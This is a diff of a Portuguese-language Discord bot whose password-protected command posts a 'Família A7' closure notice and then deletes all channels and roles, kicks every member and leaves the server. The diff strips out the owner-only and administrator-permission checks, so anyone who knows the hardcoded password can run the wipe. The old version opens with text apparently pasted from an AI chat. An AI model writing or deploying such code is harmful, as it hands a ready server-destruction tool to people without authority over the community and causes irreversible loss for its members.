@@ -1,6 +1,4 @@
-
-Você disse:
-import { Client, GatewayIntentBits, PermissionsBitField } from "discord.js";
+import { Client, GatewayIntentBits } from "discord.js";
 import express from "express";
 
 // ================= CONFIG =================
@@ -10,7 +8,7 @@ const SENHA = "lm1234pcd";
 
 // =============== TOKEN CHECK ===============
 if (!TOKEN) {
-  console.error("❌ TOKEN não definido no Render (Environment Variables)");
+  console.error("❌ TOKEN não definido no Render");
   process.exit(1);
 }
 
@@ -31,7 +29,7 @@ app.listen(3000, () => console.log("KeepAlive ativo"));
 
 // ================= READY ===================
 client.once("ready", () => {
-  console.log(🤖 Logado como ${client.user.tag});
+  console.log(`🤖 Logado como ${client.user.tag}`);
 });
 
 // ================= COMMAND =================
@@ -39,18 +37,7 @@ client.on("messageCreate", async (message) => {
   if (!message.guild) return;
   if (message.author.bot) return;
 
-  if (message.content === ${PREFIX}finala7) {
-    if (message.author.id !== message.guild.ownerId) {
-      return message.reply("❌ Apenas o dono do servidor pode usar.");
-    }
-
-    if (
-      !message.guild.members.me.permissions.has(
-        PermissionsBitField.Flags.Administrator
-      )
-    ) {
-      return message.reply("❌ Preciso de ADMINISTRADOR.");
-    }
+  if (message.content === `${PREFIX}finala7`) {
 
     await message.reply("🔐 Digite a senha para confirmar:");
 
@@ -63,40 +50,37 @@ client.on("messageCreate", async (message) => {
 
     collector.on("collect", async (msg) => {
       if (msg.content !== SENHA) {
-        return message.channel.send("❌ Senha incorreta. Cancelado.");
+        return message.channel.send("❌ Senha incorreta. Operação cancelada.");
       }
 
-      await message.channel.send(📢 ⚠️ **AVISO OFICIAL – LEIAM COM ATENÇÃO** ⚠️
+      await message.channel.send(`📢 ⚠️ **AVISO OFICIAL – LEIAM COM ATENÇÃO** ⚠️
 
 Hoje chega ao fim um ciclo que marcou histórias, amizades e momentos inesquecíveis.
 Após muito tempo de existência, decisões difíceis e reflexões necessárias, informamos que a **FAMÍLIA A7 FOI OFICIALMENTE ENCERRADA**.
 
-Nada disso apaga tudo o que foi vivido aqui. Cada conversa, cada risada, cada conflito e cada conquista fizeram parte dessa caminhada.
-
 A partir deste momento, todas as atividades estão finalizadas.
-Não haverá continuidade, retomada ou substituição.
 
-🖤 **Família A7 – encerrada.**);
+🖤 **Família A7 – encerrada.**`);
 
-      // Apagar canais
+      // APAGAR CANAIS
       for (const c of message.guild.channels.cache.values()) {
         try { await c.delete(); } catch {}
       }
 
-      // Apagar cargos
+      // APAGAR CARGOS
       for (const r of message.guild.roles.cache.values()) {
         if (r.managed) continue;
         try { await r.delete(); } catch {}
       }
 
-      // Expulsar membros
+      // EXPULSAR MEMBROS
       await message.guild.members.fetch();
       for (const m of message.guild.members.cache.values()) {
         if (m.id === client.user.id) continue;
         try { await m.kick("Encerramento Família A7"); } catch {}
       }
 
-      // Bot sai
+      // BOT SAI
       await message.guild.leave();
     });
 
